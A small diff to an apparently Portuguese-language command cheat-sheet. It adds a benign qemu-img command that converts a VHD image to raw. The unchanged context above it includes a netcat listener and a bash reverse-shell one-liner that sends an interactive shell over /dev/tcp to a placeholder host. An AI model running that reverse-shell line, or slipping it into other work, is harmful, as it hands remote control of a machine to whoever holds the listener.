@@ -2844,6 +2844,10 @@ nc -lp 3000
 bash -i > /dev/tcp/ip-servidor/3000 0>&1
 
 ```
+### Converter VHD
+```
+qemu-img convert -f vpc -O raw something.vhd something.raw
+```
 
 # Geral
 <a href="#Dicas-ng">`^`</a>
